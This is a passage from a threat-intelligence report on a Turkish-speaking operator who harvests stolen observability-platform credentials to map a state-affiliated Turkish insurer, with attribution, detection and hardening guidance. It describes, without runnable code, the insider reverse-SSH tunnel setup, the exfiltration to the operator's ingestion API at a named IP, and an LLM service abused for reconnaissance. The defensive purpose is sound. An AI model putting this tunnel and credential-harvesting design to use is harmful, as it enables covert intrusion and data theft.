| Zabbix | Zabbix API endpoint | Stolen admin or read-only credential |
| VMware Aria | Aria vCenter / ESXi monitoring endpoint | Stolen credential |

The PowerShell collector on the insider workstation runs the same 5-minute cycle and POSTs to the operator's ingestion API on port 8096. This means Instana data flows in via **two paths** during each cycle: directly from operator-to-Instana (using the stolen JWT) and from insider-PowerShell-to-operator (using the same JWT relayed through the insider's workstation).

**T+0:30 to T+1:00** — Per-source normalization layer transforms raw API responses into a common schema. Turkish-language docstrings in `topology_mapper.py` show the normalization logic ("Service label'ından host bilgisi çıkar"). Normalized records land in TimescaleDB (time-series) and feed the cross-source correlation logic in `correlation_v3.py`.

**T+1:00 to T+1:30** — Cross-source correlation merges per-source host records via FQDN normalization across the victim's internal AD, Linux-estate, and VMware-cluster domains, and writes the merged topology to Neo4j. The unified-topology graph element count is updated.

**T+1:30 to T+2:00** — `arpa-autolearn.service` runs anomaly detection (Isolation Forest + DBSCAN + LOF + statistical methods) over the updated dataset and flags anomalous hosts or behaviors for operator review. Flagged results land in `/opt/ARPA/data/collector.db`.

**T+2:00 to T+5:00** — Idle wait until next cycle. The dashboard at port 8090 and the unified-topology API at port 8095 serve cached queries from the in-memory and Redis-cached views.

The cycle then repeats. Daily-topology log generation occurs once per day at approximately operator-end-of-day, summarizing the day's data deltas and writing to `daily_topology_<YYYYMMDD>.log`. The most recent log is dated 2026-05-23.

### 6.2 Insider Reverse-SSH Tunnel Registration Behavior

The reverse-SSH tunnel registration behavior is reconstructed from the operator's Turkish-language documentation (Section 5.3) rather than from observed runtime behavior, because the tunnel is established from inside the victim network and is not observable externally.

Sequence:

1. Insider opens PuTTY on Windows workstation.
2. Insider loads the saved PuTTY session named `ARPA_Tunnel`.
3. The session is pre-configured to connect to `209.38.205.158:22` with reverse tunnel mapping port 18080 (operator-side) to localhost:8089 (insider-side) and to authenticate using the operator-supplied private key `rca_key.ppk`.
4. PuTTY initiates an outbound TCP connection to `209.38.205.158:22` (SSH).
5. SSH session is established; the reverse tunnel is registered server-side on `209.38.205.158:18080`.
6. Operator can now connect to `localhost:18080` on the operator VPS and the connection is forwarded over the SSH tunnel to `localhost:8089` on the insider's workstation.

The tunnel persists for the lifetime of the PuTTY session. If the session drops, `TUNNEL_RESTART.md` provides the insider with restart procedures.

Network signature observable from victim-side network monitoring: long-lived outbound TCP from internal Windows workstation to `209.38.205.158:22` with tunneled application traffic. Detection rule: Sysmon Event ID 3 (network connection) showing internal-to-external TCP to `209.38.205.158:22` with extended session duration is a high-signal indicator.

### 6.3 AI-Augmented Natural-Language Query Interface Behavior

The AI service exposes an HTTP endpoint on the operator VPS. Architectural runtime behavior (inferred from `ai_service.py` code structure plus the sparse `ai_assistant.db` query history):

1. Operator submits a natural-language query (English or Turkish) to the AI service HTTP endpoint.
2. The retrieval layer (`data_retrieval.py`) fetches relevant context from Neo4j (topology) and TimescaleDB (events).
3. Context + query packaged into a Moonshot AI / Kimi API request (operator's outbound HTTPS to the Kimi API endpoint).
4. Kimi response received; parsed and stored in `ai_assistant.db`.
5. Response served back to operator with citation links to specific topology elements or events.

The query history in `ai_assistant.db` is sparse at investigation time (consistent with dev-stage rather than production maturity). Network signature observable from operator-side egress: outbound HTTPS to Moonshot AI / Kimi API endpoints. Detection rule: outbound HTTPS to Moonshot AI / Kimi API combined with the operator-host filesystem indicators (`/opt/ARPA/` plus `~/.openclaw/`) is the diagnostic combination for the AI-Augmented Recon TTP (Sigma rule 11 in linked detection file).

### 6.4 Dashboard and HTTP Service Observation

The operator's HTTP services on the open directory were observed externally during the investigation:

- **Port 8090 (ARPA dashboard).** Returns HTML containing the operator self-branding footer "ARPA © 2026 the victim organization | Read-Only Compliance | Mock Data: ❌" plus the operator dashboard UI. Server header: `SimpleHTTP/0.6 Python/3.10.12` (consistent with Python `http.server.SimpleHTTPServer`). Detection signature: HTTP response from `209.38.205.158:8090` with the Python SimpleHTTP server header and the operator-branded body content (Suricata rule in linked detection file).
- **Port 8095 (unified-topology API).** Returns JSON containing unified-topology graph extracts. Endpoint `/api/topology/unified` returns the cached unified-topology export.
- **Port 8096 (Instana ingestion API).** Accepts POSTs from the insider PowerShell collector. Unauthenticated — no Authorization header required for ingestion.
- **Port 8098 (code exposure).** Was open during early investigation phases (returning operator Python source code via directory listing); selectively closed approximately 2026-03-14 after Hunt.io indexing, but ports 8090 and 8095 remained open through 2026-05-23.

### 6.5 Operator Interactive Source IP Capture

The operator's interactive source IP was captured from ARPA server logs on 2026-05-20 between 21:22 and 21:30 UTC. The capture window represents the operator actively connecting to and interacting with the ARPA dashboard during a normal operational session. The captured source IP resolves to **TurkNet AS12735** (Turkish residential / SMB ISP, Istanbul area). No VPN, Tor, or commercial proxy layer was interposed between operator and operator VPS during this session.

Local Turkish time for the 21:22–21:30 UTC capture window is 00:22–00:30 (UTC+3 Turkish time). Late-evening / very-early-morning local working hours are consistent with non-professional individual operator pattern — they are inconsistent with the disciplined business-hours operational pattern of a professional state-intelligence unit.

---

## 7. MITRE ATT&CK Mapping

> **Analyst note:** This case's behaviors map to MITRE ATT&CK in the companion detection file, where each technique is tied to its detection logic. To keep this report focused, the full technique table is not duplicated inline.

The full ATT&CK technique mapping for this case is maintained alongside the detection rules on the **[detection rules page →](https://the-hunters-ledger.com/hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections/)**.

---

## 8. Indicators of Compromise

> **Analyst note:** The complete IOC set for this case is published as a machine-readable JSON feed for direct SIEM/EDR ingestion — it is not duplicated inline here. The highest-priority indicators are also surfaced in the IOC panel (fingerprint icon) on this page.

**Full IOC feed:** [`/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/turkish-arpa-openclaw-state-insurer-209.38.205.158-iocs.json) — every indicator for this case, with type / confidence / recommended action.

---

## 9. Threat Actor Assessment

> **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-013 is an internal tracking designation assigned by The Hunters Ledger to actors observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports — it is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.

### Attribution Conclusion

**Threat Actor:** UTA-2026-013 (Turkish-speaking, Turkish-located, intra-Turkey single-thread operator)
**Confidence:** MODERATE (78% — high-MODERATE within the CLAUDE.md MODERATE band 70–85%)
- **Why this confidence:** Five-axis Turkish geographic convergence (language + handle + self-branding + target + residential ISP) is the strongest single-dimension attribution evidence in the entire parent campaign; 73+ day patient dwell + 780-file zero-monetization sweep across all operator artifacts; espionage tradecraft pattern at HIGH confidence (85%); operator residential IP captured during active session 2026-05-20 21:22–21:30 UTC = late-evening Turkish local time.
- **What's missing:** Zero Tier-2 vendor corroboration at investigation date — this is the first public attribution; real-world identity remains INSUFFICIENT (three competing handle-interpretation hypotheses); state-aligned-vs-political-factional sub-type discrimination INSUFFICIENT (both at MODERATE high-end within band).
- **What would increase confidence:** TurkNet subscriber-record disclosure via Turkish LE subpoena for the 2026-05-20 21:22–21:30 UTC capture window producing operator real-world identity; USOM / CERT-TR independent attribution corroboration; one or more Tier-2 vendor (Mandiant Turkey, Kaspersky, CrowdStrike) publishing independent attribution research on the same operator; the victim organization post-disclosure internal forensics naming an internal access path.

### First-Public-Attribution Status

This report is the **first public attribution** of this operator. Cross-vendor naming check (research done during attribution analysis):

| Vendor / Source | Coverage status |
|---|---|
| Trend Micro | NONE — no Trend Micro coverage at investigation date |
| Mandiant | NONE |
| CrowdStrike | NONE |
| Kaspersky | NONE |
| Hunt.io threat-actor catalog | NONE — confirmed via Hunt MCP query during investigation |
| VirusTotal threat-actor associations | NONE — `209.38.205.158` is 0/91 clean with zero related threat actors; operator residential IP is also 0/91 clean |
| MITRE ATT&CK Groups | NONE — no documented Turkish-government-aligned APT TTP-overlap (Sea Turtle / Teal Kurma / Marbled Dust have zero documented BFSI targeting and zero TTP overlap with this campaign) |

**Publication-significance signal (not a confidence boost):** Sub-report 2 in this same parent series (Russian Gemini, UTA-2026-012) received Trend Micro Tier-2 corroboration three days before disclosure, which upgraded its attribution from MODERATE 75% to MODERATE 83%. This sub-report (Turkish ARPA, UTA-2026-013) has the opposite profile: zero prior public attribution exists. The absence of corroboration is a publication-significance signal (this is first-ever vendor attribution via UTA designation), **not** a confidence reduction relative to attribution-anchor evidence. Confidence remains at high-MODERATE 78% based on primary-source operator-filesystem evidence alone.

### Five-Axis Turkish Convergence

The strongest single-dimension attribution evidence in the entire parent campaign:

| Axis | Evidence |
|---|---|
| Turkish language | 8 Turkish-language operator-authored Markdown tunnel-setup documents + Turkish-language docstrings throughout ARPA Python source code + Turkish-language operator output strings (`=== SON 5 KORELASYON ===`) + Turkish-language PowerShell collector header comment |
| Turkish GitHub handle | `MehmetARPA` (Mehmet is among most common Turkish given names; Arpa is a real Turkish surname; ARPA also matches the operator's self-branded codename — three competing interpretation hypotheses) |
| Turkish self-branding | `ARPA Korelasyon Motoru` (Turkish: "ARPA Correlation Engine") in code docstrings, dashboard footer, GitHub repository name, systemd unit naming convention |
| Turkish target | the victim organization — a state-affiliated Turkish financial-sector organization, with a selectively-targeted major-state-bank partner carrying sanctions-related geopolitical-leverage interest |
| Turkish residential ISP source IP | TurkNet AS12735 captured 2026-05-20 21:22–21:30 UTC = late-evening Turkish local working hours; no VPN / Tor masking; consistent with operator-located-in-Turkey |

### Sub-Type Assessment

The 780-file zero-monetization sweep formally rules out the commercial sub-types. Remaining viable sub-types (probabilities are descriptive, not point estimates):

| Sub-type | Approximate weight | Status |
|---|---|---|
| (a) State-aligned-loosely-controlled | ~40% | MODERATE high-end within band |
| (b) Commercial / hire-for-spy | ~5% | Effectively ruled out by zero-monetization sweep |
| (c) Political / factional intelligence | ~35% | MODERATE high-end within band |
| (d) Pre-positioning destructive operation | ~15% | LOW — no destructive staging artifacts in operator filesystem |
| (e) Insurance fraud preparation | ~5% | Effectively ruled out (wrong target data class) |
| (f) Other criminal opportunist | ~5% | Effectively ruled out by zero-monetization sweep |

**Sub-type discrimination status:** INSUFFICIENT. Sub-types (a) and (c) are both at MODERATE high-end within the band with no ruling artifact in operator filesystem to discriminate between them. Discrimination would require: Turkish-language doc full-read for political-event references + OSINT pivot on `MehmetARPA` handle + Turkish political event correlation (which Turkish political faction was operationally active during the 73-day campaign window, what state-sector-relevant events occurred). Sub-type discrimination is NOT publication-gating; attribution confidence holds at high-MODERATE 78% regardless of which of (a) or (c) is the ultimately correct sub-type.

### Real-World Identity Assessment

**Real-world identity confidence: INSUFFICIENT.** The public GitHub handle `MehmetARPA` is preserved as a behavioral IOC only; this report does NOT name "Mehmet ARPA" as a confirmed real-world threat actor.

Three competing handle-interpretation hypotheses are indistinguishable from current evidence:

1. **Real-name actor hypothesis.** The operator's real name is Mehmet Arpa and they used their real name as their GitHub handle. This would be a serious OPSEC failure consistent with non-professional individual operator profile, but is not unprecedented in published cybercrime reporting.
2. **Codename-after-codename adoption hypothesis.** The operator created a GitHub handle matching their self-branded project codename (`ARPA`) and chose `Mehmet` as a generic first-name prefix because Mehmet is among the most common Turkish given names.
3. **Coincidental real-surname hypothesis.** The operator is some other individual whose real surname happens to be Arpa, who chose to incorporate their surname into a handle alongside their project codename.

Damage-mitigation rationale for not naming: naming "Mehmet Arpa" as confirmed real-world actor would risk damaging an innocent person who shares the handle's surname. Mehmet is among the most common Turkish given names; Arpa is a real Turkish surname; the combination produces a non-trivial number of real Turkish individuals named Mehmet Arpa who have nothing to do with this operator. Real-name attribution requires evidence beyond handle matching — Turkish LE subpoena on TurkNet for the captured session window is the most plausible path.

### Insider Intent Classification

**Insider intent confidence: INSUFFICIENT.** The named victim-organization Windows AD user (identifier suppressed from this public report — full identifier in the offline FULL evidence briefing for victim-coordination use only) appears in operator-authored documentation as the operational target of the reverse-SSH tunnel deployment. The insider's intent classification cannot be determined from external evidence:

- **Cooperative insider:** intentionally collaborating with operator. Highest-severity scenario but unprovable externally.
- **Coerced insider:** under threat or duress. No coercive language visible in operator-authored documentation.
- **Deceived insider:** believes operator is a legitimate vendor or consultant. The ARPA dashboard footer's "Read-Only Compliance" framing would support this deception narrative.
- **Compromised-account insider:** the named Windows AD account has been compromised and the human user is unaware. In this scenario, the documentation would have been authored for an operator-controlled session under the named user's identity (LOW-confidence scenario classification — requires victim-side forensic access to confirm or rule out).

Determining the correct classification requires victim-side forensic access — interviewing the named user, reviewing workstation forensic state, reviewing communications history, and verifying whether the user recognizes the PuTTY session name or the SSH keys. This investigation must be coordinated through General Counsel and HR because of the insider-in-chain risk and the legal-evidentiary requirements.

### Confidence Ceiling Analysis

Current attribution confidence ceiling is **high-MODERATE 78% within MODERATE band**. The 9 evidence anchors documented across the parent investigation are at saturation for what primary-source operator-filesystem evidence alone can deliver. Further confidence elevation requires external corroboration:

- **Path to HIGH (85–95%):** TurkNet subscriber-record disclosure via Turkish LE subpoena (single most likely single-evidence anchor); USOM independent attribution corroboration via prior victim-organization incident intel; one or more Tier-2 vendors publishing independent attribution research on the same operator under any tracking handle.
- **Path to DEFINITE (95%+):** MIT (Turkish intelligence) official attribution; 3+ Tier-2 vendor convergence under any tracking handle; the victim organization post-disclosure internal forensics naming an internal access path with positive linkage to a specific Turkish state-aligned unit OR confirmed real-world identity via Turkish LE prosecution; cross-platform identity verification on the GitHub handle producing confirmable LinkedIn / academic / prior-employment linkage with provable operator action.

---

## 10. Risk and Detection

> **Analyst note:** This section orients defenders to the detection-coverage map for this campaign and references the linked detection file for the actual rule content. Detection rules are not embedded in this report — they are in the separate detection file that ships alongside this report and the structured IOC feed.

**Structured detection coverage (authoritative):** [`/hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections/`](/hunting-detections/turkish-arpa-openclaw-state-insurer-209.38.205.158-detections/)

### Detection Coverage Summary

The linked detection file contains **26 rules across 3 detection layers**:

| Detection layer | Count | MITRE techniques covered | Overall FP risk |
|---|---|---|---|
| YARA (file-based) | 8 | T1059.001, T1059.006, T1543.002, T1552.001, T1078, T1119, T1572 | LOW–MEDIUM |
| Sigma (log-based) | 12 | T1059.001, T1078, T1098.004, T1543.002, T1046, T1119, T1071.001, T1572, T1021.004, T1020 | LOW–HIGH (per rule) |
| Suricata (network-based) | 6 | T1071.001, T1572, T1059.001, T1046 | LOW–MEDIUM |

**Priority breakdown:**
- HIGH priority (deploy immediately, low tuning required): 14 rules
- MEDIUM priority (deploy with environment-specific threshold tuning): 9 rules
- LOW priority (hunting / governance baseline only): 3 rules

The detection file organizes rules by three campaign surfaces: victim-side artifacts (PowerShell collector + insider reverse-tunnel tooling), operator-side platform artifacts (ARPA Python ETL platform + systemd service naming + AI service + Markdown ops notes), and network / infrastructure layer (C2 ingestion endpoints + DNS + SSH tunnel patterns + Instana API abuse).

### Highest-Priority Detection Rules

For SOC analysts and threat hunters: the four detection rules below are the highest-signal rules in the file. Refer to the linked detection file for the full rule content with YARA / Sigma / Suricata syntax.

1. **YARA rule 1: ARPA Korelasyon Motoru self-branding detection.** Targets the operator self-branded strings in any file. Near-zero false-positive risk because the operator's project codename does not occur in legitimate software.
2. **Sigma rule 7: Multi-source observability cross-platform authentication.** Targets the diagnostic signature of the Observability-Tool Reverse Pipeline TTP — same source IP authenticating against ≥2 of {Instana, SolarWinds, Zabbix, Datadog, NewRelic, VMware Aria, Dynatrace, Prometheus} within a short time window. This rule covers a TTP with no existing published detection guidance.
3. **Sigma rule 6: Long-lived observability JWT detection.** Governance baseline rule for Instana customers — flags JWTs with `exp` claim ≥ 1 year. Not a direct attack-detection rule but a governance hygiene rule that would have surfaced the victim organization 10-year JWT defect (HIGH-confidence assessment: the rule fires deterministically on the captured JWT's `exp` claim of approximately 2034-02, which exceeds any reasonable 1-year threshold by 9+ years) before the operator weaponized it.
4. **Suricata rule 2: Multi-platform observability authentication egress.** Network-layer companion to Sigma rule 7 — detects outbound HTTPS to multiple observability platform domains from the same source IP within a short time window.

### Response Orientation (Brief)

This is not an incident-response guide. Readers with active IR requirements should engage their internal IR team or a dedicated playbook; this report scope is publication intelligence, not IR consultancy. Three priority categories for defender orientation:

- **Detection priorities (deploy first):** Sigma rule 7 (multi-source observability cross-platform authentication) and YARA rule 1 (ARPA self-branding). These are the two highest-signal-to-noise detections for the campaign-defining TTPs.
- **Persistence targets (look for and remove):** `/opt/ARPA/` filesystem tree; `arpa-*.service` systemd unit files; `~/.ssh/rca_key.*` SSH keys on any internal workstation; PuTTY saved session named `ARPA_Tunnel`; Turkish-language Markdown setup documentation in user-profile directories matching the `(GERCEK|PUTTY|SSH|TUNNEL|WINDOWS)_*.md` pattern.
- **Containment categories (action labels for IR team to expand):** Rotate all observability platform credentials in parallel (Instana, SolarWinds, Zabbix, VMware Aria); segregate and forensically review the named insider workstation under General Counsel coordination; block egress to `209.38.205.158` ports 22, 8089, 8090, 8095, 8096; coordinate operator-VPS takedown with DigitalOcean's abuse desk after victim notification.

---

## 11. Confidence Levels Summary

Findings organized by confidence level for the higher-level view:

### DEFINITE (Direct Evidence)

- Operator self-identification as `ARPA Korelasyon Motoru` (code docstrings + dashboard footer + GitHub repository name + systemd unit naming convention)
- Operator VPS infrastructure: `209.38.205.158` on DigitalOcean Frankfurt (AS14061)
- 4-source observability harvest: Instana 10-year JWT + SolarWinds Orion + Zabbix + VMware Aria — all four stolen credential sources directly observed in operator code
- 5 systemd daemons polling on 5-minute cadence (DEFINITE from systemd unit file inspection)
- Victim identification: the victim organization (JWT tenant claim + endpoint URL + dashboard footer all confirm)
- Stolen Instana JWT lifetime: issued 2024-03-06, expires approximately 2034-02 (10-year lifetime DEFINITE from JWT claim inspection)
- 5-axis Turkish geographic convergence (language + handle + self-branding + target + residential ISP)
- Turkish residential ISP source IP captured 2026-05-20 21:22–21:30 UTC on TurkNet AS12735 (DEFINITE from server log capture)
- Operator-authored Turkish-language insider-recruitment documentation (8 Markdown files in operator filesystem)
- Operator-supplied SSH keys (`rca_key.ppk` / `rca_key.pem`) referenced in operator documentation
- PowerShell collector with hardcoded JWT and `Invoke-RestMethod -SkipCertificateCheck` to victim Instana endpoint
- Cleartext HTTP egress from PowerShell collector to operator ingestion API (`209.38.205.158:8096/api/ingest/instana`)
- A selective major-state-bank deep-dive snapshot disproportionately large within the operator's 43-application Instana access set

### HIGH (Strong Evidence)

- Campaign active as of 2026-05-23 (most recent daily-topology log generation date in operator filesystem)
- 7,552-element unified-topology graph element count (from operator export file)
- 1,859 victim host count (from operator's AI/ML anomaly-detection module input set)
- OpenClaw upstream substrate (presence of `~/.openclaw/` and `~/.clawdbot/` directories on operator host)
- Moonshot AI / Kimi LLM provider choice (operator's `IDENTITY.md` content reference + `ai_service.py` API binding)
- Espionage tradecraft pattern (73+ day patient dwell + 780-file zero-monetization sweep)
- UTA-2026-013 attribution at high-MODERATE 78% within MODERATE band (5-axis Turkish convergence)
- Insider-recruitment third-party-detection-before-victim-org-internal-detection structural rarity (4-factor combination confirmed against 2024-2026 published corpus)
- Reverse-SSH tunnel architecture documentation (mapping operator VPS `:18080` to insider workstation `localhost:8089`)

### MODERATE (Reasonable Evidence)

- Observability-Tool Reverse Pipeline TTP novelty (closest documented adjacent is structurally distinct; "cannot exclude classified prior art" caveat applies)
- Sub-type (a) state-aligned-loosely-controlled (~40% probability) and sub-type (c) political/factional (~35% probability) tied at MODERATE high-end within band
- AI-Augmented Infrastructure Reconnaissance TTP at CANDIDATE status (N=1; needs N≥2 cross-operator validation)
- Selective major-state-bank deep-dive consistent with sanctions-related geopolitical-leverage targeting interest
- Operator emoji-in-output tradecraft signature (consistent across multiple modules but not unique to this operator)
- Limited indicator-removal evidence (some `auth.log` truncation patterns visible but not conclusive)
- Insider tunnel currently active (architecture documented; activation state cannot be confirmed externally)

### LOW (Weak / Circumstantial Evidence)

- Late-evening Turkish local working hours (00:22–00:30) as a non-professional individual operator indicator (consistent with the pattern but a single captured window is a narrow sample)
- Three competing `MehmetARPA` handle-interpretation hypotheses indistinguishable from current evidence
- Whether the operator has used the AI-augmented natural-language query interface successfully against live data (sparse query history in `ai_assistant.db`)
- Sub-type (d) pre-positioning destructive operation (~15% probability — weakly supported by absence of destructive staging artifacts; cannot fully rule out)

### INSUFFICIENT (Cannot Assess)

- Real-world identity of UTA-2026-013 operator (handle preserved as behavioral IOC only; not a real-name identification)
- State-aligned-vs-political-factional sub-type discrimination (both at MODERATE high-end with no ruling artifact)
- Insider intent classification (cooperative / coerced / deceived / compromised-account)
- Insider current employment status with the victim organization
- Whether reverse-SSH tunnel is currently established at investigation date
- Operator account binding to Moonshot AI / Kimi (subscriber identity unknown)
- Operator account binding to OpenClaw / Lightmake (subscriber identity unknown)
- Cross-vendor Tier-2 vendor corroboration (NONE at investigation date — first public attribution)
- Tier-1 government attribution (NONE at investigation date — FBI / CISA / USOM / MIT / Turkish LE)
- Whether the victim organization has internally detected the compromise during the 70+ day external-detection-to-presumed-internal-detection gap window

---

## 12. Coverage Gaps

This section identifies what cannot be assessed from available evidence and what closes each gap. Surfacing gaps is attribution discipline; concealing them damages credibility.

### Tier-2 Vendor Coverage Gap

No Trend Micro, Mandiant, CrowdStrike, Kaspersky, or Hunt.io threat-actor catalog coverage of this operator exists at investigation date. The campaign is first-public-attribution status. **Closing the gap requires** one or more Tier-2 vendors to publish independent attribution research on the same operator under any tracking handle. This sub-report's publication is itself a likely accelerant of that timeline (MODERATE-confidence assessment based on prior precedent where first-public-attribution reports from independent researchers have triggered Tier-2 vendor follow-up research within the same operational quarter).

### Classified / Paid-Corpus Prior Art Gap

The Observability-Tool Reverse Pipeline TTP novelty claim is held at the top of the MODERATE band with an explicit "cannot exclude classified prior art" qualifier because Recorded Future Intelligence, Mandiant Advantage, and Intel471 paid intelligence platforms were not reviewed during prior-art research. **Closing the gap requires** access to those paid corpora — direct access by the research team or coordination with a customer of one of those platforms who can perform the query.

### IBM Instana Turkish OCP Customer Base Gap

The breadth of IBM Instana's Turkish OCP customer deployment is unknown. **Closing the gap requires** IBM PSIRT coordination. A PSIRT advisory to IBM Instana customers (not a CVE — this is a customer governance defect, not an Instana product vulnerability) would surface comparable defects in other deployments.

### TurkNet Subscriber-Record Integrity Gap

The 2025 TurkNet breach disclosure (2.8M records affected) creates a question about subscriber-record evidentiary integrity for subpoena purposes. **Closing the gap requires** assessment of whether the TurkNet breach affected subscriber records for the operator's specific account / IP. This assessment is Turkish-LE-internal and is not externally observable.

### Moonshot AI / Kimi Abuse-Reporting Path Gap

No Moonshot-specific abuse-reporting documentation was found during research. **Closing the gap requires** direct platform contact via Moonshot AI's general-channel customer support and escalation to Trust-and-Safety.

### Underground Forum Coverage Gap

Russian-language and Turkish-language underground cybercrime forum coverage of observability API token abuse is a persistent gap in the threat-intel community's open-source corpus. **Closing the gap requires** dedicated forum-monitoring research (specialized vendors exist for this; The Hunters Ledger does not have direct corpus access at investigation date).

### AI-Augmented Infrastructure Reconnaissance Cross-Operator Validation Gap

The CANDIDATE novel TTP is at N=1 (this case). **Closing the gap requires** a second independent operator to be documented deploying an LLM-backed natural-language query interface over stolen victim telemetry. Cross-operator validation is the gating constraint for promoting CANDIDATE to confirmed-novel.

### Insider Forensic-Access Gap

The named insider's intent classification, current employment status, workstation forensic state, and whether the reverse-SSH tunnel is currently active **cannot be determined from external evidence**. **Closing the gap requires** victim-side forensic access — controlled insider interview and workstation forensic imaging, handled with appropriate legal/HR coordination.

### Operator Account Binding Gaps

Operator account bindings for Moonshot AI / Kimi and for OpenClaw remain unknown. The operator's GitHub account (`MehmetARPA`) was suspended by GitHub Trust & Safety on 2026-05-25, partially closing this gap. Full account-holder disclosure would still require appropriate legal process. Moonshot AI / Kimi and OpenClaw / Lightmake account-holder disclosure follows their respective T&S protocols.

---

## 13. Calibration Notes and Retractions

This section documents analytical retractions, novelty-claim calibration after full prior-art review, and framing decisions that affect downstream interpretation.

### Observability-Tool Reverse Pipeline TTP Novelty — MAINTAINED at top of MODERATE band

**Initial claim:** Observability-Tool Reverse Pipeline is a novel TTP with no documented prior art.

**After full prior-art review:** Claim MAINTAINED at high-MODERATE (top of MODERATE band 70–85%). Closest documented adjacent cases reviewed:

- **SolarWinds Sunburst (MITRE Campaign C0024, December 2020):** structurally distinct. Sunburst is a supply-chain backdoor injection into the vendor's update infrastructure — code is compromised at compile time before customer deployment. ARPA is stolen-credential reverse pipeline against the vendor's customer — no vendor product is compromised. The two cases share only the word "SolarWinds" in their reporting; the structural attack pattern is categorically different.
- **UNC6395 OAuth-based Salesforce CRM breach (August 2025):** structurally distinct. UNC6395 stole OAuth tokens for Salesforce and conducted one-time mass exfiltration affecting approximately 700 customer tenants. ARPA steals API tokens for multiple observability platforms (Instana, SolarWinds, Zabbix, VMware Aria) and conducts sustained ETL against a single named tenant. The attack-target structure (single named tenant vs. 700-tenant mass exfiltration) and the sustained-vs-one-time dimension differentiate the cases.
- **Other observability-platform-abuse cases (2024–2026 published corpus):** none documented a 4-source cross-correlated sustained ETL against a single named victim with a production-grade operator-built analytics platform.

**Residual qualifier:** "Cannot exclude classified / paid-corpus prior art." Recorded Future Intelligence, Mandiant Advantage, and Intel471 paid intelligence platforms were not reviewed during prior-art research; the claim cannot be promoted to HIGH or DEFINITE until absence of prior art in those corpora is confirmed.

### AI-Augmented Infrastructure Reconnaissance TTP — CANDIDATE STATUS MAINTAINED at N=1

**Initial claim:** AI-Augmented Infrastructure Reconnaissance Using Stolen APM Credentials is a CANDIDATE novel TTP.

**After full review:** Claim MAINTAINED at CANDIDATE status (N=1). The architectural pattern is documented in operator filesystem (`ai_service.py` + `ai_assistant.db` + `data_retrieval.py`) but cross-operator validation at N≥2 is required before promoting to confirmed-novel. The architectural pattern is straightforward to replicate, so cross-operator confirmation is expected on a months-to-quarters horizon once the pattern enters public threat-intel awareness (MODERATE-confidence timeline projection based on the replicability of the LLM-over-stolen-telemetry architecture).

### 10-Year Instana JWT — GOVERNANCE DEFECT, NOT IBM PRODUCT CVE

**Initial framing risk:** the captured 10-year JWT is at risk of being miscoverage'd as an "IBM Instana vulnerability" — a recurring framing error in prior third-party reporting on Instana token-lifetime defects (HIGH-confidence framing risk based on observed mischaracterization patterns in coverage of similar customer-side JWT defects in 2024–2025).

**Correct framing:** the JWT lifetime is set by the customer in their Instana token-provisioning configuration. IBM Instana does not enforce a maximum token lifetime by default; the customer is responsible for setting rotation policy. The captured JWT represents a victim-organization-side credential governance failure, NOT an IBM Instana product CVE. IBM PSIRT notification framing is customer-hardening-advisory, not CVE-disclosure.

### Attribution Coverage Status — CONFIRMED

**Initial claim:** UTA-2026-013 has zero prior public attribution across Trend Micro, Mandiant, CrowdStrike, Kaspersky, Hunt.io threat-actor catalog, MITRE ATT&CK groups, and VirusTotal threat-actor associations.

**After full cross-vendor naming check:** Claim CONFIRMED. Zero prior coverage exists across all reviewed sources; see the cross-vendor naming table in Section 9 for detail. The absence of prior coverage is a publication-significance signal, **not** a confidence reduction.

### Insider-Recruitment Third-Party-Detection Structural Rarity — CONFIRMED

**Initial claim:** No 2024–2026 published case combines all four structural factors of this finding (third-party detection precedes victim detection + single specific state-affiliated corporate victim + named individual insider identifiable from operator artifacts + 70+ day gap before presumed victim awareness).

**After full 2024–2026 published-corpus review:** Claim CONFIRMED. Rippling/Deel (2025), Coinbase (2025), and other insider-threat reference cases are internal-detection-first events; they lack the third-party-first detection structural dimension. This finding is publication-defining.

### Confidence Label Normalization Note

The parent attribution-analyst output used a hybrid "MODERATE/HIGH" label at 78% in 14 places. The CLAUDE.md attribution confidence scale has no hybrid band between MODERATE (70-85%) and HIGH (85-95%); this report normalizes 78% to either "high-MODERATE 78%" (descriptive annotation within the canonical MODERATE band 70-85%) or "MODERATE 78%". Substantive evidentiary assessment is unchanged; only the label format has been normalized for consistency with project standard.

---

## 14. Defender Follow-Ups

Hunt strategies and hardening guidance for adjacent observability-platform customer populations and the broader Turkish state sector.

### Hunt Strategies for Adjacent Defender Populations

**IBM Instana customers (any tenant):**
- Governance audit: review all Instana API tokens for `exp` claim. Rotate any token with `exp ≥ 1 year`.
- Detection: deploy Sigma rule 6 (long-lived observability JWT detection) as a baseline governance signal.
- Cross-platform monitoring: deploy Sigma rule 7 (multi-source observability cross-platform authentication) to detect the broader Observability-Tool Reverse Pipeline TTP class.

**SolarWinds Orion customers:**
- Service-account audit: review all Orion service-account credentials for source-IP allow-listing. Implement source-IP restriction on all admin service accounts.
- Audit log review: search for source-IP authentications from outside the documented admin allow-list.

**Zabbix customers:**
- Admin credential audit: review all Zabbix admin and read-only credentials. Implement source-IP allow-listing on all admin credentials.

**VMware Aria customers (Broadcom):**
- Aria credential audit: review all Aria credentials accessing vCenter / ESXi monitoring. Implement source-IP allow-listing.

**Turkish state-sector defenders (general):**
- The operator's 5-axis Turkish convergence indicates a Turkish-located operator with Turkish-state-sector targeting interest. Other state-affiliated Turkish corporates are plausibly in operator interest scope (MODERATE-confidence inference based on the 5-axis Turkish convergence pattern — Turkish operator location, Turkish language tradecraft, Turkish state-affiliated target selection, Turkish residential ISP, Turkish working-hours pattern — even though no additional victims are visible in the current operator-filesystem evidence).
- Coordinate with USOM (TR-CERT) for sector-wide advisory on observability-platform credential governance.

---

© 2026 Joseph. All rights reserved. See LICENSE for terms.

